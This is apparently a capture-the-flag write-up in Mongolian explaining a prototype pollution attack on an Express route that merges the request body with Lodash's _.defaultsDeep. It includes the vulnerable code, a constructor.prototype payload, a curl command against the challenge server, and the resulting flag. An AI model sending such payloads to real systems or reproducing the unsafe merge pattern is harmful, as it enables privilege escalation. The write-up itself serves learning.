# Lodash - Prototype Pollution

### JavaScript-ийн "Удамшил" (The Prototype)

JavaScript-д объект болгон "эцэг"-тэй байдаг. Үүнийг нь `Prototype` гэж нэрлэдэг.

- Жишээ нь: Чи нэг шинэ хоосон объект `{}` үүсгэлээ гэж бодъё. Тэр объект дотор чинь юу ч байхгүй мэт боловч, цаанаа бүх объектын эцэг болох `Object.prototype`той холбоотой байдаг.

```javascript
app.post('/skoopy', (req, res) => {
    const user = {
        userip: req.connection.remoteAddress,
    };
    parsedBody = _.defaultsDeep({
        admin: false, 
        content: '', 
    }, req.body)
    if(user.admin) {
        res.send(flag)
        process.exit(0)
    }
```

### Хоолны жор ба Lodash-ийн "алдаа"

`_.defaultsDeep` функц нь хоёр өөр "жор"-ыг (объектыг) нэгтгэдэг функц юм.

- **Серверийн код:** "Хэрэглэгч бүрт `admin: false` гэсэн эрх өгнө" гэсэн дүрэмтэй.

### Чиний хийсэн "Халдлага"

Чи сервер рүү ийм өгөгдөл илгээсэн:
`{"constructor": {"prototype": {"admin": true}}}`

```bash
curl -s http://139.162.5.230:10332/skoopy \
     -H "Content-Type: application/json" \
     -d '{"constructor": {"prototype": {"admin": true}}}' -v -X POST

..................................
hz{5p00ky_5c4ry_pr0707yp3_p0llu710n_a9074dbf51bff857}
* Connection #0 to host 139.162.5.230:10332 left intact
```

### Үр дүн: Яаж "Админ" болов?

Код дотор `user` гэдэг шинэ объект үүсэхэд:

```javascript
const user = { userip: '202.21.x.x' };
if (user.admin) { ... }
```

1. Систем эхлээд `user` объект дотроос `admin` гэдэг түлхүүр хайна. **Байхгүй.**
2. Дараа нь түүний "эцэг" буюу `Prototype` руу нь орж хайна.
3. Тэнд чиний түрүүн "бохирдуулж" үлдээсэн `admin: true` байж байна!
4. Систем: "За, эцэг дээр нь `true` байгаа юм байна, тэгвэл энэ хэрэглэгч Админ мөн юм байна" гэж үзээд чамд флаг-ыг өгчихөж байгаа юм.
